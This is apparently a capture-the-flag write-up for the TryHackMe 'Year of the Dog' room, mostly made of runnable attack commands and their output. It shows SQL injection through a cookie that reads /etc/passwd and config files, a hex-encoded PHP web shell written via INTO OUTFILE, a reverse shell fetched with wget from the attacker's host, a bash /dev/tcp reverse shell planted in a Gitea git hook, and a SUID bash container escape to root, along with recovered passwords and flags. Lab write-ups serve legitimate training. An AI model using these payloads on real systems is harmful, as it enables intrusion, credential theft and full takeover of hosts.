CTF URL: https://tryhackme.com/r/room/yearofthedog
# IP
```
10.10.55.189
```
# Reconaisance
## NMAP
```bash
nmap -p- -T4 10.10.55.189 -v
22,80
# trash:
3511/tcp  filtered webmail-2
50433/tcp filtered unknown

nmap -p22,80 -sS -sC -sV 10.10.55.189 -v

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:c9:dd:9b:db:95:9e:fd:19:a9:a6:0d:4c:43:9f:fa (RSA)
|   256 c3:fc:10:d8:78:47:7e:fb:89:cf:81:8b:6e:f1:0a:fd (ECDSA)
|_  256 27:68:ff:ef:c0:68:e2:49:75:59:34:f2:bd:f0:c9:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Canis Queue
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
## WEB
### Dirb
```bash
dirb http://<ip>/
# result
index.php

```
### Nikto
```bash
nikto -h <ip>
config.php
/icons/README
```
# SQLi in cookie
checking storage in browser, there is a cookie
```bash
curl http://10.10.55.189 -H "Cookie: id=0"
```
gives error
```bash
curl http://10.10.55.189 -H "Cookie: id='"
```
gives server error
```bash
curl http://10.10.55.189 -H "Cookie: id=' UNION select 1,3 -- -"
```
means that there are 2 columns. and 3 is displayed.
```bash
curl http://10.10.55.189 -H "Cookie: id=' UNION select 1,(<payload>) -- -"
curl http://10.10.55.189 -H "Cookie: id=' UNION select 1,(select version()) -- -"
```
gets version `5.7.34-0ubuntu0.18.04.1`
# SQLi 
to get table names
```bash
curl http://10.10.55.189 -H "Cookie: id=' UNION select 1,(select TABLE_NAME FROM information_schema.tables limit 5,1)  -- -" | grep "<p>"

# brute force
for i in {1..1000..1}; do curl http://10.10.55.189 -H "Cookie: id=' UNION select 1,(select TABLE_NAME FROM information_schema.tables limit $i,1)  -- -" | grep "<p>"; done
```
it will reveal `queue` table

```bash
curl http://10.10.55.189 -H "Cookie: id=' UNION select 1,(select COLUMN_NAME from information_schema.columns where table_name = 'queue' limit 1)  -- -"
```
it gives `userID`, `queueNum`
```bash
# brute force
for i in {1..1000..1}; do echo $i; curl http://10.10.55.189 -H "Cookie: id=' UNION select 1,(select queueNum from queue limit $i ,1)  -- -" | grep "<p>"; done
```
there are several number 1s, and changing my cookie to it gives me nothing.
# SQLi RCE?
```

<?php system($_GET['cmd']);?>

' UNION select 1, "<?php system(sleep 5);?>"  -- -

```
php payload is getting blocked because of `<` and `>` signs.

```bash
curl http://10.10.55.189 -H "Cookie: id=' UNION select 1, < INTO OUTFILE '/var/www/html/shell.php' -- -"
```
still cannot write `<` and `>`

# SQLi to read file 
```bash
curl http://10.10.55.189 -H "Cookie: id=' UNION select 1,load_file('/etc/passwd') -- -"
```
and it works
index file:
```bash
curl http://10.10.55.189 -H "Cookie: id=' UNION select 1,load_file('/var/www/html/index.php') -- -"
```
```php
<?php
        $badStrings=array("3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d2f7661722f7777772f646f672f3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a", "DUMPFILE", "SLEEP", "LOADFILE", "AND", ">", "<", "CONCAT", "IF", "ELT", "0,1");
        $stringsLen=count($badStrings);


        require_once "config.php";

        if(!isset($_COOKIE["id"])){
                $cookie = bin2hex(random_bytes(16));
                $queueNum = rand(1,100);
                setcookie("id", $cookie, NULL, "/");

                $sql = "INSERT INTO queue VALUES ('". $cookie . "',". $queueNum .")";
                if(!$dbh->query($sql) === TRUE){
                        die("Error: " . $dbh->error);
                }
        }
        else {
                $cookie = $_COOKIE["id"];
                for($x=0; $x<$stringsLen;$x++){
                        if (strstr($cookie, $badStrings[$x]) !== false){
                                die("RCE Attempt detected");
                        }
                }
                $sql = "SELECT * FROM queue WHERE userID='". $cookie . "'";
                $result = $dbh->query($sql);
                if(!$result === TRUE){
                        die("Error: " . $dbh->error);
                }
                else if ($result->num_rows > 0){
                        while($row =  $result->fetch_assoc()){
                                $queueNum = $row["queueNum"];
                        }
                }
                else{
                        $queueNum = "Error";
                }
        }
?>

```
encoded file says
```php
< ?php if (
  isset($_REQUEST[ "upload" ])
) {$dir = $_REQUEST[ "uploadDir" ];
if (
  phpversion()< '4.1.0'
) {$file = $HTTP_POST_FILES[ "file" ][ "name" ];
@move_uploaded_file(
  $HTTP_POST_FILES[ "file" ][ "tmp_name" ], 
  $dir."/".$file
) 
or die();
}else{$file = $_FILES[ "file" ][ "name" ];
@move_uploaded_file(
  $_FILES[ "file" ][ "tmp_name" ], $dir."/".$file
) 
or die();
}@chmod($dir."/".$file, 0755);
echo "File uploaded";
}else {echo "<form action=".$_SERVER[ "PHP_SELF" ]." method=POST enctype=multipart/form-data><input type=hidden name=MAX_FILE_SIZE value=1000000000><b>sqlmap file uploader</b><br><input name=file type=file><br>to directory: <input type=text name=uploadDir value=/var/www/dog/> <input type=submit name=upload value=upload></form>";
}? >

```
config file
```bash
curl http://10.10.55.189 -H "Cookie: id=' UNION select 1,load_file('/var/www/html/index.php') -- -"

```
```php
<?php
        $servername = "localhost";
        $username = "web";
        $password = "Cda3RsDJga";
        $dbname = "webapp";

        $dbh = new mysqli($servername, $username, $password, $dbname);
        if ($dbh->connect_error){
                die("Connection failed: ". $dbh->connect_error);
        }
?>
```
`web:Cda3RsDJga`

other things
```bash
curl http://10.10.55.189 -H "Cookie: id=' UNION select 1,load_file('/etc/passwd') -- -"

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
mysql:x:105:108:MySQL Server,,,:/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:109:114::/var/lib/landscape:/usr/sbin/nologin
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
dylan:x:1000:1000:dylan,,,:/home/dylan:/bin/bash
```

# SQLi RCE
```php
<?php system($_GET['cmd']);?>
```
into hex
```hex
0x3c3f7068702073797374656d28245f4745545b27636d64275d293b3f3e
```

```bash
curl http://10.10.55.189 -H "Cookie: id=' UNION select 1, 0x3c3f7068702073797374656d28245f4745545b27636d64275d293b3f3e INTO OUTFILE '/var/www/html/s.php'  -- -"
```
and it works
`http://10.10.55.189/s.php?cmd=id` -> `1 uid=33(www-data) gid=33(www-data) groups=33(www-data) `

# Rev Shell
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ vim php-reverse-shell.php 
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 -m http.server                                             
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
`http://10.10.55.189/s.php?cmd=wget%20http://10.8.97.245:8000/php-reverse-shell.php`
then navigate to the php file

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -lnvp 8888
listening on [any] 8888 ...
connect to [10.8.97.245] from (UNKNOWN) [10.10.55.189] 58210
Linux year-of-the-dog 4.15.0-143-generic #147-Ubuntu SMP Wed Apr 14 16:10:11 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 16:00:33 up  2:45,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 

```
stabilisation of shell
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# ctrl+z
stty raw -echo; fg
```
# Priv Esc to user
```bash
www-data@year-of-the-dog:/home/dylan$ cat work_analysis | grep dylan
Sep  5 20:52:57 staging-server sshd[39218]: Invalid user dylanLabr4d0rs4L1f3 from 192.168.1.142 port 45624
Sep  5 20:53:03 staging-server sshd[39218]: Failed password for invalid user dylanLabr4d0rs4L1f3 from 192.168.1.142 port 45624 ssh2
Sep  5 20:53:04 staging-server sshd[39218]: Connection closed by invalid user dylanLabr4d0rs4L1f3 192.168.1.142 port 45624 [preauth]

dylan@year-of-the-dog:~$ cat user.txt 
THM{OTE3MTQyNTM5NzRiN2VjNTQyYWM2M2Ji}

```
`dylan:Labr4d0rs4L1f3`

# Priv Esc to root
```bash
dylan@year-of-the-dog:/opt$ ss -tulpn
Netid State   Recv-Q  Send-Q         Local Address:Port      Peer Address:Port  
udp   UNCONN  0       0              127.0.0.53%lo:53             0.0.0.0:*     
udp   UNCONN  0       0          10.10.55.189%eth0:68             0.0.0.0:*     
tcp   LISTEN  0       128                127.0.0.1:33577          0.0.0.0:*     
tcp   LISTEN  0       80                 127.0.0.1:3306           0.0.0.0:*     
tcp   LISTEN  0       128            127.0.0.53%lo:53             0.0.0.0:*     
tcp   LISTEN  0       128                  0.0.0.0:22             0.0.0.0:*     
tcp   LISTEN  0       128                127.0.0.1:3000           0.0.0.0:*     
tcp   LISTEN  0       128                        *:80                   *:*     
tcp   LISTEN  0       128                     [::]:22                [::]:*     
dylan@year-of-the-dog:/opt$ 
```
additionally you can ssh with dylan. So port forwarding
```bash
ssh -L 3000:127.0.0.1:3000 dylan@10.10.55.189 -N
```
You will get access to another page under `localhost:3000` - Gitea app (`Gitea Version: 1.13.0`).
there is interesting file`/gitea/gitea/gitea.db`, try to delete two-factor, and login as dlyan
![[yotd 1.png]]

After this maneur you can log in as dylan without 2FA
Then navigate to a repo and settings
![[yotd 2.png]]you can add a revshell at the end
```bash
/bin/bash -c 'bash -i >& /dev/tcp/10.8.97.245/4444 0>&1'
```

Then git clone the repository make changes and push. you will receivce a shell
```bash
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.8.97.245] from (UNKNOWN) [10.10.55.189] 60428
bash: cannot set terminal process group (17): Not a tty
bash: no job control in this shell
bash-5.0$ whoami
whoami
git
bash-5.0$ 
```
it is container.
then `sudo -l` and `sudo su root`, and you are root in container.

```bash
bash-5.0# pwd 
pwd 
/data/gitea
bash-5.0# ls
ls
attachments
avatars
conf
gitea.db
indexers
log
queues
sessions
bash-5.0# 
```
seems like the same as in main system in `/gitea/gitea`

So, add a Suid binary

then in main
```bash
cp /bin/bash /gitea/gitea/
```

in container
```bash
chown root:root bash
chmod u+s bash
```

then in main
```bash
./bash -p
```

```bash
bash-4.4# cat root.txt
THM{MzlhNGY5YWM0ZTU5ZGQ0OGI0YTc0OWRh}
bash-4.4# 
```